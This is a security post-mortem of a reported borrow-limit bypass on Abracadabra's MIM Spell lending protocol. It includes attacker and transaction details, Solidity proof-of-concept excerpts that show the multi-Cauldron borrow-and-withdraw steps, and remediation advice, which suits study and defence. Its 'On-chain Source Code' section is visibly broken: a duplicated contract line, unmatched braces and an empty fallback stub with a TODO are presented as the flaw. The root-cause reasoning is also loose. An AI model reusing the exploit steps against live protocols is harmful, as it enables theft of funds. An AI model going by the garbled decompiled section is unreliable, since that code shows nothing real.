# MIM Spell3 — Borrow Limit Bypass Analysis

| Field | Details |
|------|------|
| **Date** | 2025-10-15 |
| **Protocol** | MIM Spell (Abracadabra) |
| **Chain** | Ethereum |
| **Loss** | ~1,700,000 USD |
| **Attacker** | [0x1aaade3e9062d124b7deb0ed6ddc7055efa7354d](https://etherscan.io/address/0x1aaade3e9062d124b7deb0ed6ddc7055efa7354d) |
| **Attack Tx** | [0x842aae91...](https://etherscan.io/tx/0x842aae91c89a9e5043e64af34f53dc66daf0f033ad8afbf35ef0c93f99a9e5e6) |
| **Vulnerable Contract** | [0x46f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c](https://etherscan.io/address/0x46f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c) |
| **Root Cause** | Cauldron's `borrowLimit` check can be bypassed via distributed borrowing across multiple Cauldrons |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-10/MIMSpell3_exp.sol) |

---

## 1. Vulnerability Overview

Abracadabra's MIM protocol sets a `borrowLimit` per Cauldron to cap the maximum borrow amount for a single address. However, a design flaw allowed an attacker to borrow simultaneously across multiple Cauldrons — each individual limit would be respected, yet the total borrowed amount could exceed the actual collateral value. By distributing borrows across numerous Cauldrons, the attacker drained approximately $1.7M worth of MIM.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: per-Cauldron limit check, no aggregate limit
interface ICauldron {
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);

    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
}

// Each Cauldron only checks its own borrowPartPerAddress
// Borrowing below the limit in each Cauldron individually results in no aggregate check

// ✅ Recommended fix: implement a global borrow limit registry
mapping(address => uint256) public globalBorrowedPerUser;
uint256 public globalBorrowLimit;

function borrow(uint256 amount) external {
    globalBorrowedPerUser[msg.sender] += amount;
    require(globalBorrowedPerUser[msg.sender] <= globalBorrowLimit, "global limit exceeded");
    ...
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: MIMSpell3_decompiled.sol
contract MIMSpell3 {
contract MIMSpell3 {

    // This contract has no standard ABI selectors.
    // Likely a minimal proxy (EIP-1167), fallback-only, or custom dispatcher.

    fallback() external payable {  // ❌ Vulnerability
        // TODO: decompilation logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Prepare collateral assets (for multiple Cauldrons)
  │
  ├─[2]─▶ Cauldron_A.cook(ADD_COLLATERAL + BORROW)
  │         └─ Borrow MIM below borrowPartPerAddress limit
  │
  ├─[3]─▶ Cauldron_B.cook(ADD_COLLATERAL + BORROW)
  │         └─ Borrow additional MIM from another Cauldron
  │
  ├─[4]─▶ Repeat for Cauldron_C, D, E ...
  │         └─ Each Cauldron's individual limit respected, but aggregate total exceeded
  │
  ├─[5]─▶ Withdraw all MIM from BentoBox
  │
  ├─[6]─▶ Swap MIM → USDC/USDT via Curve/UniswapV3
  │
  └─[7]─▶ ~1,700,000 USD drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function _borrowFromAllCauldrons() internal {
    // Borrow from every Cauldron, each below its own borrowPartPerAddress limit
    for (uint256 i = 0; i < cauldrons.length; i++) {
        _borrowFromCauldron(cauldrons[i], borrowAmounts[i]);
    }
}

function _borrowFromCauldron(address cauldron, uint256 borrowAmount) internal {
    // Execute collateral deposit + MIM borrow in a single transaction via cook()
    uint8[] memory actions = new uint8[](2);
    uint256[] memory values = new uint256[](2);
    bytes[] memory datas = new bytes[](2);

    // Action 20: ADD_COLLATERAL
    actions[0] = 20;
    datas[0] = abi.encode(collateralShare, address(this), false);

    // Action 5: BORROW (below each individual Cauldron's limit)
    actions[1] = 5;
    datas[1] = abi.encode(borrowAmount, address(this));

    ICauldron(cauldron).cook(actions, values, datas);
}

function _withdrawAllMIMFromBentoBox() internal {
    // Withdraw the full MIM balance from BentoBox
    IBentoBox(BENTOBOX).withdraw(MIM, address(this), address(this), 0, totalMIMShares);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing global borrow limit (only per-Cauldron limits enforced; no aggregate limit across multiple Cauldrons) |
| **Attack Vector** | Distributed borrowing across multiple Cauldrons |
| **Impact** | Large-scale drain of protocol MIM liquidity |
| **CWE** | CWE-840: Business Logic Errors |
| **DASP Classification** | Business Logic / Access Control |

## 6. Remediation Recommendations

1. **Global Borrow Limit Registry**: Implement a global registry that tracks the aggregate borrow amount across all Cauldrons per user.
2. **Shared Limit Across Cauldrons**: Apply a shared limit when the same user borrows from multiple Cauldrons.
3. **Global Collateral-to-Borrow Ratio Validation**: Add a global check to ensure total borrows do not exceed a defined percentage of total collateral value.
4. **Real-time Position Monitoring**: Implement on-chain monitoring to detect abnormal multi-Cauldron borrowing patterns.

## 7. Lessons Learned

- Per-component limit checks alone cannot guarantee security at the system level.
- "Distributed attacks" spanning multiple pools/vaults/markets can bypass each individual check.
- When designing DeFi protocols, "global invariants" (system-wide constraints) must be explicitly defined and enforced.